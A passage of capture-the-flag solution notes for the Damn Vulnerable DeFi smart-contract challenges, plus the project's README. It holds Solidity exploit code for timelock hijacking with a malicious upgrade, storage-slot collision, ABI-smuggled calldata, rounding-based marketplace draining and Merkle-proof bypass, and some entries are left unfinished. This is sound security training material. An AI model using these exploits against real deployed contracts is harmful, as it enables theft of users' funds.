  <summary> Code </summary>

  ```solidity
contract ClimberVault_Broken is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function initialize(
        address admin,
        address proposer,
        address sweeper
    ) external initializer {
        __Ownable_init(msg.sender);
        __UUPSUpgradeable_init();
    }

    function sweepFunds(address token) external {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}


contract Attack {
    ClimberTimelock public immutable lock;
    ClimberVault public immutable vault;
    address public immutable player;
    constructor(ClimberTimelock _lock, ClimberVault _vault, address _player){
        lock = _lock;
        vault = _vault;
        player = _player;
    }

    function attack() public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[1] = address(lock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE,address(this));

        targets[0] = address(lock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", player);

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        lock.execute(targets, values, dataElements, "0x0");
    }

    function schedule() public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);

        targets[1] = address(lock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)",PROPOSER_ROLE, address(this));

        targets[0] = address(lock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("transferOwnership(address)", player);

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        lock.schedule(targets, values, dataElements,  "0x0");
    }   
}

function test_climber() public checkSolvedByPlayer {
   Attack attack = new Attack(timelock, vault, player);
        attack.attack();


    ClimberVault_Broken newVault = new ClimberVault_Broken();
    vault.upgradeToAndCall(address(newVault), "");
    vault.sweepFunds(address(token));
    token.transfer(recovery, token.balanceOf(player)); 
} 
        
```
</details>

---
###  Wallet Mining

#### Task: 

There’s a contract that incentivizes users to deploy Safe wallets, rewarding them with 1 DVT. It integrates with an upgradeable authorization mechanism, only allowing certain deployers (a.k.a. wards) to be paid for specific deployments.

The deployer contract only works with a Safe factory and copy set during deployment. It looks like the [Safe singleton factory](https://github.com/safe-global/safe-singleton-factory) is already deployed.

The team transferred 20 million DVT tokens to a user at `0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b`, where her plain 1-of-1 Safe was supposed to land. But they lost the nonce they should use for deployment.

To make matters worse, there's been rumours of a vulnerability in the system. The team's freaked out. Nobody knows what to do, let alone the user. She granted you access to her private key.

You must save all funds before it's too late!

Recover all tokens from the wallet deployer contract and send them to the corresponding ward. Also save and return all user's funds.

In a single transaction.

#### Solution Explanation:

Since the SafeProxyFactory uses the create2 opcode to deploy contracts, we have access to the necessary data for this deployment, allowing us to test different nonces until we obtain the desired contract address. After several attempts, we determined that the correct nonce is 13.

Next, we observe that the TransparentProxy contract uses the same storage slot for the upgrader as the AuthorizerUpgradeable contract does for needsInit. By calling setUpgrader on the proxy contract, the storage slot — previously set to zero during initialization — is overwritten, allowing us to reinitialize the contract and designate ourselves as the future deployer (ward).

With the user’s private key, the final step is to sign a transaction from the Safe wallet authorizing the transfer of funds to the recovery address.


<details>
  <summary> Code </summary>

  ```solidity

contract Attack {

    constructor(address walletDeployer, address token, address user, address authorizer, address player, address depositAddress, address ward){
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = depositAddress;
        AuthorizerUpgradeable(payable(address(authorizer))).init(wards, aims);
        
        address[] memory owners = new address[](1);       
        owners[0] = user;

        bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)", 
            owners, 
            1,
            0,
            "",  
            address(0),
            address(0),
            0,
            address(0)
        );
        uint256 nonce = 13;
        WalletDeployer(walletDeployer).drop(depositAddress, initializer, nonce);
        IERC20(token).transfer(ward, 1 ether);

    }

    function attack(address token, address user, address depositAddress,  bytes memory signature) public {
        bytes memory data = abi.encodeWithSignature(
            "transfer(address,uint256)", 
            user, 
            IERC20(token).balanceOf(depositAddress)
        );
        Enum.Operation operation = Enum.Operation.Call;
        bool success = Safe(payable(depositAddress)).execTransaction(
            token,
            0,
            data,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(address(0)),
            signature
        );

    }      
}




function test_walletMining() public checkSolvedByPlayer {
    Attack attack = new Attack(address(walletDeployer), address(token), user,  address(authorizer), player, USER_DEPOSIT_ADDRESS, ward);

    bytes memory data = abi.encodeWithSignature(
        "transfer(address,uint256)", 
        user, 
        token.balanceOf(USER_DEPOSIT_ADDRESS)
    );
    Enum.Operation operation = Enum.Operation.Call;

    bytes32 txHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
        address(token),
        0,
        data,
        operation,
        0,
        0,
        0,
        address(0),
        address(0),
        0
    );

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);  
    bytes memory signature = abi.encodePacked(r, s, v);

    attack.attack(address(token), user, USER_DEPOSIT_ADDRESS, signature);
}
  ```
</details>

---
###  Puppet V3

#### Task: 

#### Solution Explanation:





- [x]  Puppet V3

так же как и те паппеты просто v3 устроен сложнее (сделать описание по тикам)

<details>
  <summary> Code </summary>

```solidity
function test_puppetV3() public checkSolvedByPlayer {
    IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
    Attack attack = new Attack(lendingPool, token, uniswapPool, weth, recovery);
    token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
    attack.attack();
    attack.getETH();
    skip(110 seconds);
    weth.approve(address(lendingPool), weth.balanceOf(player));
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}
```
</details>

---
###  ABI Smuggling

#### Task: 

There’s a permissioned vault with 1 million DVT tokens deposited. The vault allows withdrawing funds periodically, as well as taking all funds out in case of emergencies.

The contract has an embedded generic authorization scheme, only allowing known accounts to execute specific actions.

The dev team has received a responsible disclosure saying all funds can be stolen.

Rescue all funds from the vault, transferring them to the designated recovery account.


#### Solution Explanation:

In this exploit, ABI-smuggling was used to bypass authorization checks and execute unauthorized actions within the vault. Here’s an outline of how it works:

Offset Manipulation: We create custom calldata that shifts data to manipulate function selectors and bypass the vault’s permissions check. We made it longer to place a needed function selector padded with blank bytes before the actual actionData parameter.


This allowed us to pass the check for a function selector that was allowed for us, but the sweepFunds function was ultimately called, which allowed us to access the contract funds.


<details>
  <summary> Code </summary>

  ```solidity
  function test_abiSmuggling() public checkSolvedByPlayer {
        bytes memory actionData = hex"1cff79cd0000000000000000000000001240FA2A84dd9157a0e76B5Cfe98B1d52268B26400000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b";
        (bool success, bytes memory result) = address(vault).call{value: 0}(actionData);
        assertEq(success, true);
        /*
        execute
        0x1cff79cd

        target
        0000000000000000 
        000000001240FA2A
        84dd9157a0e76B5C
        fe98B1d52268B264
        
        offset
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000080

        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000

        withdraw.selector
        d9caed1200000000
        0000000000000000
        0000000000000000
        0000000000000000

        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000044
    
        sweepFunds.selector+receiver+amount
        85fb709d00000000
        0000000000000000
        73030b99950fb19c
        6a813465e58a0bca
        5487fbea00000000
        0000000000000000
        8ad159a275aee56f
        b2334dbb69036e9c
        7bacee9b
        */
    }

```
</details>


---
###  Shards

#### Task: 

The Shards NFT marketplace is a permissionless smart contract enabling holders of Damn Valuable NFTs to sell them at any price (expressed in USDC).

These NFTs could be so damn valuable that sellers can offer them in smaller fractions ("shards"). Buyers can buy these shards, represented by an ERC1155 token. The marketplace only pays the seller once the whole NFT is sold.

The marketplace charges sellers a 1% fee in Damn Valuable Tokens (DVT). These can be stored in a secure on-chain vault, which in turn integrates with a DVT staking system.

Somebody is selling one NFT for... wow, a million USDC?

You better dig into that marketplace before the degens find out.

You start with no DVTs. Rescue as much funds as you can in a single transaction, and deposit the assets into the designated recovery account.

#### Solution Explanation:

The discovered vulnerability allows the marketplace price rounding to zero under specific conditions, resulting in free shard purchases and facilitating an exploit where shards are bought and immediately canceled for profit. 


When the price is rounded down due to insufficient precision, shards become available for zero-cost acquisition.
So you are able to initiate 12,000 purchases of these "zero-cost" shards, acquiring them without expending DVT tokens.
Once the shards are acquired, they are canceled in the same transaction, triggering refunds or direct profits.

After you can transfers all DVT to the designated recovery account.


<details>
  <summary> Code </summary>

  ```solidity
contract Attack {
    ShardsNFTMarketplace public immutable marketplace;
    address public immutable recovery;
    DamnValuableToken public immutable token;


    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery){
        marketplace = _marketplace;
        recovery = _recovery;
        token = _token;
    }

    function attack() public {
        for(uint i = 0; i < 12000; i++){marketplace.fill(1, 100);}
        for (uint i = 0; i < 12000; i++) { marketplace.cancel(1,i);}

        token.transfer(recovery, token.balanceOf(address(this)));
    } 
}


function test_shards() public checkSolvedByPlayer {
    IShardsNFTMarketplace.Offer memory offer = marketplace.getOffer(uint64(1));
    Attack attack = new Attack(marketplace, token, recovery);
    attack.attack();
}

  ```
</details>

---
###  Curvy Puppet

#### Task: 

#### Solution Explanation:


- [ ]  Curvy Puppet
<details>
  <summary> Code </summary>

  ```solidity
  ```
</details>

---
###  Withdrawal

#### Task: 

There's a token bridge to withdraw Damn Valuable Tokens from an L2 to L1. It has a million DVT tokens in balance.

The L1 side of the bridge allows anyone to finalize withdrawals, as long as the delay period has passed and they present a valid Merkle proof. The proof must correspond with the latest withdrawals' root set by the bridge owner.

You were given the event logs of 4 withdrawals initiated on L2 in a JSON file. They could be executed on L1 after the 7 days delay.

But there's one suspicious among them, isn't there? You may want to double-check, because all funds might be at risk. Luckily you are a bridge operator with special powers.

Protect the bridge by finalizing _all_ given withdrawals, preventing the suspicious one from executing, and somehow not draining all funds.


#### Solution Explanation:

So first of all, we need to identify the suspicious transaction. Using L2MessageStore and L2Handlers contract we can receive for such transaction *the timestamp, nonce, l2Sender, target, selector of executeTokenWithdrawal, receiver and amount* for function finalizeWithdrawal with the message to L1Forwarder.forwardMessage.


After analyzing the transaction data:
- Transactions 1, 2, and 4 each request a withdrawal of 10 DVT.
- Transaction 3, however, attempts to withdraw 999,000 DVT, indicating a likely malicious transaction.

To complete all transactions safetly we can use our operator role. Like this we can bypass the Merkle proof validation within the finalizeWithdrawal function:

```solidity
if (!isOperator) {
    if (MerkleProof.verify(proof, root, leaf)) {
        emit ValidProof(proof, root, leaf);
    } else {
        revert InvalidProof();
    }
}
```
With this role, we can execute withdrawals directly, bypassing proof verification for each transaction.

Instead of fully executing Transaction 3, we withdraw the majority of tokens to our address, leaving only enough (30 DVT) to fulfill the three valid transactions.


So to finish the task we need:
1. To withdraw nearly the full balance to secure the bridge.
2. To finalize the three valid transactions, allowing them to proceed as normal.
3. To restore the withdrawn tokens to the bridge after securing the safe transactions.


<details>
  <summary> Code </summary>

  ```solidity
function test_withdrawal() public checkSolvedByPlayer {
    skip(7 days);
        /**
        1.

        id
        eaebef7f15fdaa66 
        ecd4533eefea23a1
        83ced29967ea67bc
        4219b0f1f8b0d3ba
        
        timestamp
        0000000000000000
        0000000000000000
        0000000000000000
        0000000066729b63
        
        offset
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000060
        
        L1Forwarder.forwardMessage.selector  forwardMessage(uint256 nonce, address l2Sender, address target, bytes memory message)
        0000000000000000
        0000000000000000
        0000000000000000
        000000000000010401210a38
        
        nonce
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        
        l2Sender
        0000000000000000
        00000000328809bc
        894f92807417d2da
        d6b7c998c1afdac6
        
        target
        0000000000000000
        000000009c52b2c4
        a89e2be37972d18d
        a937cbad8aa8bd50
        
        offset
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000080
        
        length
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000044

        TokenBridge.executeTokenWithdrawal.selector
        81191e51
        
        receiver
        00000000000000000
        0000000328809bc89
        4f92807417d2dad6b
        7c998c1afdac60000
        
        amount (10ether)
        0000000000000000
        0000000000000000
        0000000000008ac7
        230489e800000000
        
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        0000000000000000
        000000000000
        */

        /**
        2. 
        amount (10ether)
        0000000000000000
        0000000000000000
        0000000000000000
        8ac7230489e80000

        3. 
        (999000ether)
        0000000000000000
        00000000ea475d60
        c118d7058bef4bdd
        9c32ba51139a74e0
        
        4.
        amount (10ether)
        0000000000000000
        0000000000000000
        0000000000000000
        8ac7230489e80000        
        */
        
    bytes memory message = abi.encodeCall( L1Forwarder.forwardMessage,
        (
            0,
            player, 
            address(l1TokenBridge), 
            abi.encodeCall( 
                TokenBridge.executeTokenWithdrawal,
                (
                    player, 
                    token.balanceOf(address(l1TokenBridge)) - 30 ether
                )
            )
        )
    );

    l1Gateway.finalizeWithdrawal({
        nonce: 0,
        l2Sender: l2Handler,
        target: address(l1Forwarder),
        timestamp: block.timestamp - 7 days,
        message: message,
        proof: new bytes32[](0)
    });

    skip(7 days);

    l1Gateway.finalizeWithdrawal({
        nonce: 0,
        l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
        target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
        timestamp: 1718786915,
        message: abi.encodeCall( L1Forwarder.forwardMessage,
        (
            0,
            0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 
            0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
            abi.encodeCall( 
                TokenBridge.executeTokenWithdrawal,
                ( 
                    0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
                    10 ether
                )
            )
        )
        ),
        proof: new bytes32[](0)
    });
        
    l1Gateway.finalizeWithdrawal({
        nonce: 1,
        l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
        target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
        timestamp: 1718786965,
        message: abi.encodeCall( L1Forwarder.forwardMessage,
        (
            1,
            0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 
            0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
            abi.encodeCall( 
                TokenBridge.executeTokenWithdrawal,
                ( 
                    0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
                    10 ether
                )
            )
        )
        ),
        proof: new bytes32[](0)
    });

    l1Gateway.finalizeWithdrawal({
        nonce: 2,
        l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
        target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
        timestamp: 1718787050,
        message: abi.encodeCall( L1Forwarder.forwardMessage,
        (
            2,
            0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 
            0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
            abi.encodeCall( 
                TokenBridge.executeTokenWithdrawal,
                ( 
                    0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
                    999000 ether
                )
            )
        )
        ),
        proof: new bytes32[](0)
    });

    l1Gateway.finalizeWithdrawal({
        nonce: 3,
        l2Sender: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
        target: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
        timestamp: 1718787127,
        message: abi.encodeCall( L1Forwarder.forwardMessage,
        (
            3,
            0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 
            0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 
            abi.encodeCall( 
                TokenBridge.executeTokenWithdrawal,
                ( 
                    0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
                    10 ether
                )
            )
        )
        ),
        proof: new bytes32[](0)
    });

    token.transfer(address(l1TokenBridge), token.balanceOf(player));
}

  ```
</details>




---
# Damn Vulnerable DeFi

Damn Vulnerable DeFi is _the_ smart contract security playground for developers, security researchers and educators.

Perhaps the most sophisticated vulnerable set of Solidity smart contracts ever witnessed, it features flashloans, price oracles, governance, NFTs, DEXs, lending pools, smart contract wallets, timelocks, vaults, meta-transactions, token distributions, upgradeability and more.

Use Damn Vulnerable DeFi to:

- Sharpen your auditing and bug-hunting skills.
- Learn how to detect, test and fix flaws in realistic scenarios to become a security-minded developer.
- Benchmark smart contract security tooling.
- Create educational content on smart contract security with articles, tutorials, talks, courses, workshops, trainings, CTFs, etc. 

## Install

1. Clone the repository.
2. Checkout the latest release (for example, `git checkout v4.0.1`)
3. Rename the `.env.sample` file to `.env` and add a valid RPC URL. This is only needed for the challenges that fork mainnet state.
4. Either install [Foundry](https://book.getfoundry.sh/getting-started/installation), or use the [provided devcontainer](./.devcontainer/) (In VSCode, open the repository as a devcontainer with the command "Devcontainer: Open Folder in Container...")
5. Run `forge build` to initialize the project.

## Usage

Each challenge is made up of:

- A prompt located in `src/<challenge-name>/README.md`.
- A set of contracts located in `src/<challenge-name>/`.
- A [Foundry test](https://book.getfoundry.sh/forge/tests) located in `test/<challenge-name>/<ChallengeName>.t.sol`.

To solve a challenge:

1. Read the challenge's prompt.
2. Uncover the flaw(s) in the challenge's smart contracts.
3. Code your solution in the corresponding test file.
4. Try your solution with `forge test --mp test/<challenge-name>/<ChallengeName>.t.sol`.

> In challenges that restrict the number of transactions, you might need to run the test with the `--isolate` flag.

If the test passes, you've solved the challenge!

Challenges may have more than one possible solution.

### Rules

- You must always use the `player` account.
- You must not modify the challenges' initial nor final conditions.
- You can code and deploy your own smart contracts.
- You can use Foundry's cheatcodes to advance time when necessary.
- You can import external libraries that aren't installed, although it shouldn't be necessary.

## Troubleshooting

You can ask the community for help in [the discussions section](https://github.com/theredguild/damn-vulnerable-defi/discussions).

## Disclaimer

All code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.
